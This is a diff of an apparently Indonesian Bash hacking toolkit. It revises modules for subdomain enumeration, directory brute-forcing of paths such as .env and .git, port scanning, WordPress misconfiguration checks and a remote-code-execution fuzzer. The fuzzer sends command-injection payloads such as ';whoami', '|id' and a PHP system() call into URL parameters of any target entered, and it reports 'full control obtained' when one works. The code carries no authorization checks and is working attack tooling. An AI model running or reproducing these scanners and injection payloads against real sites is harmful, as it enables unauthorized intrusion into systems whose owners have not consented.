@@ -695,34 +695,34 @@ function start_secret_hunter {
     echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
     read
 }
-# --- [ MODUL 06: SUBDOMAIN ENUMERATOR (DETAILED TABLE) ] ---
-
 function start_subdomain_scanner {
     clear
     local nama_modul="SUBDOMAIN SCANNER"
     
-    echo -e "\e[36m============================================================================="
+    # Header Estetik
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 06: SUBDOMAIN ENUMERATOR (PASSIVE & ACTIVE)           "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mencari 'anak perusahaan' domain melalui SSL logs dan Brute-force."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mencari 'anak perusahaan' domain melalui SSL logs dan Brute-force."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan Domain Utama (contoh: site.com): " domain
+    echo -ne "${Q} Masukkan Domain Utama (contoh: site.com): ${W}"
+    read domain
 
     if [[ -z "$domain" ]]; then
-        echo -e "\e[31m[!] Domain tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} Domain tidak boleh kosong!"; return
     fi
 
-    # Format Nama File: <DOMAIN> SUBDOMAIN SCANNER.txt
-    local filename="${domain^^} ${nama_modul}.txt"
+    # Format Nama File Aman
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_SUBDOMAIN_SCANNER.txt"
 
-    echo -e "\n\e[33m[*] Menjalankan Passive Discovery (crt.sh)... \e[0m"
+    echo -e "\n${INFO} Menjalankan Passive Discovery (${C}crt.sh${NC})... "
     # Mengambil data dari sertifikat SSL publik
     passive_list=$(curl -s "https://crt.sh/?q=%25.$domain&output=json" | grep -Po '"name_value":"\K[^"]*' | sort -u)
 
-    echo -e "[*] Memulai Active Check & Brute-force..."
-    echo -e "[*] File Log: $filename"
+    echo -e "${INFO} Memulai Active Check & Brute-force..."
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
@@ -737,88 +737,89 @@ function start_subdomain_scanner {
         echo "-----------------------------------------------------"
     } > "$filename"
 
-    # Gabungkan list pasif dengan list brute-force umum
-    subs_brute=("www" "dev" "test" "api" "staging" "admin" "mail" "blog" "v1" "v2" "shop" "internal" "portal" "cloud")
+    # Wordlist brute-force umum
+    subs_brute=("www" "dev" "test" "api" "staging" "admin" "mail" "blog" "v1" "v2" "shop" "internal" "portal" "cloud" "vpn" "secure")
     
-    # Masukkan hasil pasif ke dalam array pengerjaan
+    # Gabungkan pasif & brute, lalu hilangkan duplikat
     mapfile -t all_subs < <(echo -e "${passive_list}\n$(printf "%s.$domain\n" "${subs_brute[@]}")" | sort -u)
 
     found_count=0
     for s in "${all_subs[@]}"; do
-        # Bersihkan karakter wildcard (*.) jika ada dari crt.sh
+        # Bersihkan karakter wildcard (*.)
         s_clean=$(echo "$s" | sed 's/\*\.//g')
         
-        echo -ne "  [*] Resolving: $s_clean \r"
+        echo -ne "  ${INFO} Resolving: ${C}$s_clean ${NC}\r"
 
-        # Cek apakah subdomain resolve ke IP (menggunakan perintah 'host' atau 'getent')
+        # Cek apakah subdomain resolve ke IP
         check=$(getent hosts "$s_clean")
         
         if [[ -n "$check" ]]; then
             ip=$(echo "$check" | awk '{print $1}')
             res_status="AKTIF"
-            color="\e[32m"
-            echo -e "  [+] \e[32mFOUND:\e[0m $s_clean [$ip]"
+            echo -e "  ${OK} ${G}FOUND:${NC} ${W}$s_clean ${DG}[$ip]${NC}"
             ((found_count++))
         else
             ip="-"
             res_status="NON-AKTIF"
-            color="\e[0m"
         fi
 
-        # Tulis ke tabel log (.txt)
-        printf "%-35s | %-18s | %-10s\n" "$s_clean" "$ip" "$res_status" >> "$filename"
+        # Tulis ke tabel log (Hanya yang AKTIF agar log bersih, atau semua jika ingin audit total)
+        if [[ "$res_status" == "AKTIF" ]]; then
+            printf "%-35s | %-18s | %-10s\n" "$s_clean" "$ip" "$res_status" >> "$filename"
+        fi
         
-        sleep 0.1
+        sleep 0.05
     done
 
     echo -ne "                                                                                \r"
     echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
     
     if [ $found_count -gt 0 ]; then
-        echo -e "\e[32m[✓] Selesai! $found_count subdomain aktif ditemukan.\e[0m"
+        echo -e "${OK} ${G}${BOLD}Selesai! $found_count subdomain aktif ditemukan.${NC}"
         echo "KESIMPULAN: DITEMUKAN $found_count SUBDOMAIN AKTIF" >> "$filename"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ada subdomain tambahan yang resolve.\e[0m"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ada subdomain tambahan yang resolve.${NC}"
         echo "KESIMPULAN: TIDAK DITEMUKAN SUBDOMAIN AKTIF LAINNYA" >> "$filename"
     fi
     
-    echo -e "[*] Daftar lengkap tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Daftar lengkap tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
-# --- [ MODUL 07: DIRECTORY BRUTER TURBO (MULTI-THREADED) ] ---
-
 function start_dir_bruter {
     clear
     local nama_modul="DIRECTORY BRUTER"
     
-    echo -e "\e[36m============================================================================="
+    echo -e "${C}============================================================================="
     echo -e "              MODUL 07: DIRECTORY BRUTE-FORCER (TURBO MODE)                  "
-    echo -e "=============================================================================\e[0m"
+    echo -e "=============================================================================${NC}"
 
-    read -p "Masukkan URL Target (contoh: http://site.com/): " target
+    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
+    read target
     [[ -z "$target" ]] && return
     [[ "${target: -1}" != "/" ]] && target="$target/"
 
+    # --- LOGIKA PENAMAAN FILE AMAN ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_DIR_BRUTE.txt"
 
     # Wordlist diperluas
-    wordlist=("admin" "login" "config" "api" "v1" "v2" "db" "backup" ".env" ".git" "phpmyadmin" "secret" "dev" "staging" "test")
+    wordlist=("admin" "login" "config" "api" "v1" "v2" "db" "backup" ".env" ".git" "phpmyadmin" "secret" "dev" "staging" "test" "upload" "uploads" "images" "assets" "js" "css")
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
     # --- PENGATURAN MULTI-THREADING ---
-    local threads=5             # Jumlah request bersamaan
+    local threads=5
     local temp_fifo="/tmp/$$.fifo"
     mkfifo "$temp_fifo"
     exec 3<>"$temp_fifo"
     rm "$temp_fifo"
 
     for ((i=0; i<threads; i++)); do echo >&3; done
-    # ----------------------------------
 
-    echo -e "\n[*] Memulai Turbo Scan (Threads: $threads) pada: $target"
+    echo -e "\n${INFO} Memulai Turbo Scan (${C}Threads: $threads${NC}) pada: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     {
@@ -829,74 +830,72 @@ function start_dir_bruter {
         echo "-----------------------------------------------------"
     } > "$filename"
 
-    found_count=0
-
-    # Fungsi Internal untuk scanning (supaya bisa di-background)
+    # Fungsi Internal untuk scanning
     function check_path {
         local path=$1
         local target=$2
         local ua=$3
         local log=$4
 
-        local status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" "$target$path")
+        local status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 10 "$target$path")
 
         if [[ "$status_code" != "404" && "$status_code" != "000" ]]; then
-            local res_status="UKNOWN"
-            local color="\e[0m"
+            local res_status="UNKNOWN"
+            local color="${W}"
             
             case $status_code in
-                200) res_status="DITEMUKAN (OK)"; color="\e[32m" ;;
-                403) res_status="FORBIDDEN (403)"; color="\e[33m" ;;
-                301|302) res_status="REDIRECT"; color="\e[34m" ;;
-                500) res_status="SERVER ERROR"; color="\e[31m" ;;
+                200) res_status="DITEMUKAN (OK)"; color="${G}${BOLD}" ;;
+                403) res_status="FORBIDDEN (403)"; color="${Y}" ;;
+                301|302) res_status="REDIRECT"; color="${B}" ;;
+                500) res_status="SERVER ERROR"; color="${R}" ;;
             esac
 
-            echo -e "  [+] /$path -> ${color}$status_code $res_status\e[0m"
+            echo -e "  ${OK} ${W}/$path ${NC}-> ${color}$status_code $res_status${NC}"
             printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$log"
         fi
     }
 
     for path in "${wordlist[@]}"; do
-        read -u3 # Mengambil jatah thread
+        read -u3 
         (
             check_path "$path" "$target" "$ua" "$filename"
-            echo >&3 # Mengembalikan jatah thread
+            echo >&3 
         ) &
     done
 
-    wait # Menunggu semua background process selesai
-    exec 3>&- # Menutup file descriptor
+    wait 
+    exec 3>&- 
 
     echo -e "-----------------------------------------------------------------------------"
-    echo -e "\e[32m[✓] Scan Selesai!\e[0m Laporan tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "${OK} ${G}${BOLD}Scan Selesai!${NC} Laporan tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
-# --- [ MODUL 08: PORT SCANNER & SERVICE DISCOVERY (DETAILED TABLE) ] ---
-
 function start_port_scanner {
     clear
     local nama_modul="PORT SCANNER"
     
-    echo -e "\e[36m============================================================================="
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 08: PORT SCANNER & SERVICE DISCOVERY                  "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Memeriksa pintu masuk (port) yang terbuka dan layanan yang berjalan."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Memeriksa pintu masuk (port) yang terbuka dan layanan yang berjalan."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan IP atau Domain Target: " target
+    echo -ne "${Q} Masukkan IP atau Domain Target: ${W}"
+    read target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] Target tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} Target tidak boleh kosong!"; return
     fi
 
-    # Format Nama File Log
-    local filename="${target^^} ${nama_modul}.txt"
+    # Format Nama File Log Aman
+    local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${target_clean^^}_PORT_SCAN.txt"
 
     ports=(21 22 23 25 53 80 110 143 443 445 1433 1521 3306 3389 5432 8080 8443)
 
-    echo -e "\n[*] Memulai pemindaian pada: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Memulai pemindaian pada: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
@@ -913,9 +912,9 @@ function start_port_scanner {
 
     found_ports=0
     for port in "${ports[@]}"; do
-        echo -ne "  [*] Checking Port: $port \r"
+        echo -ne "  ${INFO} Checking Port: ${C}$port ${NC}\r"
 
-        # Cek Koneksi TCP
+        # Cek Koneksi TCP menggunakan Bash built-in
         (timeout 1 bash -c "echo > /dev/tcp/$target/$port") >/dev/null 2>&1
         result=$?
 
@@ -935,63 +934,63 @@ function start_port_scanner {
             esac
             
             res_status="OPEN"
-            color="\e[32m"
-            echo -e "  [+] Port $port -> ${color}$res_status\e[0m ($service)"
+            echo -e "  ${OK} Port ${W}$port ${NC}-> ${G}${BOLD}$res_status${NC} ${DG}($service)${NC}"
             ((found_ports++))
         else
             res_status="CLOSED/FILTERED"
             service="-"
         fi
 
-        # Tulis ke tabel log (.txt)
-        printf "%-10s | %-15s | %-20s\n" "$port" "$res_status" "$service" >> "$filename"
+        # Tulis ke tabel log hanya jika OPEN agar log ringkas
+        if [[ "$res_status" == "OPEN" ]]; then
+            printf "%-10s | %-15s | %-20s\n" "$port" "$res_status" "$service" >> "$filename"
+        fi
     done
 
     echo -ne "                                                                                \r"
     echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
     
     if [ $found_ports -gt 0 ]; then
-        echo -e "\e[32m[✓] Scan Selesai! $found_ports port aktif ditemukan.\e[0m"
+        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_ports port aktif ditemukan.${NC}"
         echo "KESIMPULAN: DITEMUKAN $found_ports PORT TERBUKA" >> "$filename"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ada port umum yang terbuka.\e[0m"
+        echo -e "${ERR} ${R}Scan Selesai. Tidak ada port umum yang terbuka.${NC}"
         echo "KESIMPULAN: TIDAK ADA PORT UMUM YANG TERDETEKSI" >> "$filename"
     fi
     
-    read -p "Tekan Enter untuk kembali ke menu..."
-}read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Laporan audit tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
-# --- [ MODUL 09: CMS VULNERABILITY SCANNER (DETAILED TABLE) ] ---
-
 function start_cms_scanner {
     clear
     local nama_modul="CMS SCANNER"
     
-    echo -e "\e[36m============================================================================="
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 09: CMS IDENTIFIER & VULN CHECKER                     "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mengidentifikasi CMS dan mencari kelemahan konfigurasi umum."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mengidentifikasi CMS dan mencari kelemahan konfigurasi umum."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan URL Target (contoh: http://site.com/): " target
+    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
+    read target
+
+    if [[ -z "$target" ]]; then
+        echo -e "${ERR} URL tidak boleh kosong!"; return
+    fi
 
     [[ "${target: -1}" != "/" ]] && target="$target/"
 
-    if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
-    fi
-
-    # Ekstraksi nama domain untuk penamaan file
+    # --- LOGIKA PENAMAAN FILE AMAN ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_CMS_AUDIT.txt"
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
     
-    echo -e "\n[*] Menganalisis target: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Menganalisis target: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Log
@@ -1007,38 +1006,39 @@ function start_cms_scanner {
     } > "$filename"
 
     # 1. Identifikasi CMS Dasar
-    page_source=$(curl -s -k -L -A "$ua" "$target")
+    page_source=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target")
     
     cms_found="Unknown"
     [[ "$page_source" == *"wp-content"* ]] && cms_found="WordPress"
     [[ "$page_source" == *"joomla"* ]] && cms_found="Joomla"
     [[ "$page_source" == *"Drupal"* ]] && cms_found="Drupal"
+    [[ "$page_source" == *"Laravel"* ]] && cms_found="Laravel (Framework)"
 
-    echo -e "  [*] Identifikasi CMS: \e[32m$cms_found\e[0m"
+    echo -e "  ${OK} Identifikasi CMS: ${G}${BOLD}$cms_found${NC}"
     printf "%-30s | %-20s\n" "CMS Core" "$cms_found" >> "$filename"
 
     # 2. Cek Kerentanan Spesifik (WordPress sebagai contoh utama)
     findings=0
     if [[ "$cms_found" == "WordPress" ]]; then
         # Cek XML-RPC
-        xml_check=$(curl -s -o /dev/null -w "%{http_code}" "$target/xmlrpc.php")
+        xml_check=$(curl -s -o /dev/null -w "%{http_code}" -k "$target/xmlrpc.php")
         if [[ "$xml_check" == "200" || "$xml_check" == "405" ]]; then
-            echo -e "  [!] Vulnerability: XML-RPC Aktif"
+            echo -e "  ${ERR} ${Y}Vulnerability:${NC} XML-RPC Aktif (Potensi Brute Force/DoS)"
             printf "%-30s | %-20s\n" "/xmlrpc.php" "ENABLED (VULN)" >> "$filename"
             ((findings++))
         fi
 
         # Cek Directory Listing Uploads
-        up_check=$(curl -s -o /dev/null -w "%{http_code}" "$target/wp-content/uploads/")
-        if [[ "$up_check" == "200" ]]; then
-            echo -e "  [!] Vulnerability: Directory Listing Uploads"
+        up_check=$(curl -s -k "$target/wp-content/uploads/" | grep -i "Index of")
+        if [[ -n "$up_check" ]]; then
+            echo -e "  ${ERR} ${Y}Vulnerability:${NC} Directory Listing di Uploads Terbuka"
             printf "%-30s | %-20s\n" "/wp-content/uploads/" "OPEN (SENSITIVE)" >> "$filename"
             ((findings++))
         fi
     fi
 
-    # Jika tidak ada temuan spesifik selain deteksi CMS
     if [ $findings -eq 0 ]; then
+        echo -e "  ${OK} Tidak ditemukan miskonfigurasi CMS standar."
         printf "%-30s | %-20s\n" "Security Patches" "SEEMS SECURE" >> "$filename"
     fi
 
@@ -1046,43 +1046,43 @@ function start_cms_scanner {
     echo "-----------------------------------------------------" >> "$filename"
     echo "KESIMPULAN: AUDIT CMS SELESAI" >> "$filename"
     
-    echo -e "[*] Laporan audit CMS tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "${INFO} Laporan audit CMS tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
-# --- [ MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER (DETAILED TABLE) ] ---
-
 function start_rce_scanner {
     clear
     local nama_modul="RCE SCANNER"
     
-    echo -e "\e[36m============================================================================="
+    echo -e "${C}============================================================================="
     echo -e "                 MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER               "
-    echo -e "=============================================================================\e[0m"
-    echo -e "\e[33m[INFO]:\e[0m Mencoba eksekusi perintah OS (Linux/Windows) via parameter URL."
+    echo -e "=============================================================================${NC}"
+    echo -e "${INFO} Mencoba eksekusi perintah OS (Linux/Windows) via parameter URL."
     echo "-----------------------------------------------------------------------------"
 
-    read -p "Masukkan URL Full (contoh: http://site.com/ping.php?host=): " target
+    echo -ne "${Q} Masukkan URL Full (contoh: http://site.com/ping.php?host=): ${W}"
+    read target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "${ERR} URL tidak boleh kosong!"; return
     fi
 
-    # Ekstraksi nama domain untuk penamaan file log
+    # --- LOGIKA PENAMAAN FILE AMAN ---
     local domain=$(echo "$target" | awk -F[/:] '{print $4}')
     [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
-    local filename="${domain^^} ${nama_modul}.txt"
+    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
+    local filename="${domain_clean^^}_RCE_AUDIT.txt"
 
-    # Payload RCE
+    # Payload RCE Teroptimasi
     rce_payloads=(
-        ";whoami" "|whoami" "&whoami" "\`whoami\`" "$(whoami)"
-        ";id" "|id" "&id" "<?php system('whoami'); ?>"
+        ";whoami" "|whoami" "&whoami" "\`whoami\`" "\$(whoami)"
+        ";id" "|id" "&id" ";ls -la" "<?php system('whoami'); ?>"
     )
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 
-    echo -e "\n[*] Memulai Fuzzing RCE pada: $target"
-    echo -e "[*] File Log: $filename"
+    echo -e "\n${INFO} Memulai Fuzzing RCE pada: ${W}$target"
+    echo -e "${INFO} File Log: ${DG}$filename${NC}"
     echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
@@ -1099,25 +1099,26 @@ function start_rce_scanner {
 
     found_rce=0
     for payload in "${rce_payloads[@]}"; do
-        # URL Encode payload menggunakan python
+        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
+        
+        # URL Encode payload menggunakan python3
         encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload")
         
-        echo -ne "  [*] Testing: $payload \r"
-        
-        response=$(curl -s -k -L -A "$ua" "$target$encoded_payload")
+        # Kirim request dengan timeout agar tidak hang
+        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")
 
-        # Cek indikator keberhasilan
-        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|nginx|root|system32"; then
+        # Cek indikator keberhasilan (mencari string sistem Linux/Unix)
+        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|nginx|root|system32|Windows IP Configuration"; then
             res_status="VULNERABLE"
-            server_resp=$(echo "$response" | grep -iE "uid=|www-data|root" | head -n 1 | cut -c1-20 | tr -d '\n\r')
-            color="\e[31m"
+            # Ambil potongan respon untuk bukti (evidence)
+            server_resp=$(echo "$response" | grep -iE "uid=|www-data|root|Windows" | head -n 1 | cut -c1-30 | tr -d '\n\r')
             
-            echo -e "  [!!!] \e[31mRCE DETECTED!\e[0m -> Payload: $payload"
-            echo -e "        Response: $server_resp"
+            echo -e "  ${OK} ${R}${BLINK}RCE DETECTED!${NC} -> Payload: ${W}$payload${NC}"
+            echo -e "        Response: ${G}$server_resp${NC}"
             ((found_rce++))
             
             printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
-            break # Stop jika sudah tembus
+            # Jangan 'break' agar kita tahu payload mana saja yang berhasil
         else
             res_status="SECURE"
             server_resp="-"
@@ -1127,21 +1128,21 @@ function start_rce_scanner {
         sleep 0.2
     done
 
-    # KOREKSI: Membersihkan baris progress (spasi kosong yang cukup)
-    echo -ne "                                                                            \r"
-    echo -e "\n-----------------------------------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$filename"
+    # Bersihkan baris progress
+    echo -ne "                                                                                \r"
+    echo -e "-----------------------------------------------------------------------------"
     
     if [ $found_rce -gt 0 ]; then
-        echo -e "\e[31m[!] ALERT: Server Terbuka! Kendali penuh didapatkan.\e[0m"
+        echo -e "${ERR} ${R}${BOLD}[!] ALERT: Server Terbuka! Kendali penuh didapatkan.${NC}"
         echo "KESIMPULAN: CRITICAL VULNERABILITY FOUND (RCE)" >> "$filename"
     else
-        echo -e "\e[32m[✓] Scan Selesai. Tidak ditemukan eksekusi perintah langsung.\e[0m"
+        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan eksekusi perintah langsung.${NC}"
         echo "KESIMPULAN: NO DIRECT RCE DETECTED" >> "$filename"
     fi
     
-    echo -e "[*] Hasil audit RCE tersimpan di: $filename"
-    read -p "Tekan Enter untuk kembali ke menu..."
+    echo -e "\n${INFO} Hasil audit RCE tersimpan di: ${DG}$filename"
+    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
+    read
 }
 # --- [ MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF) (DETAILED TABLE) ] ---
 
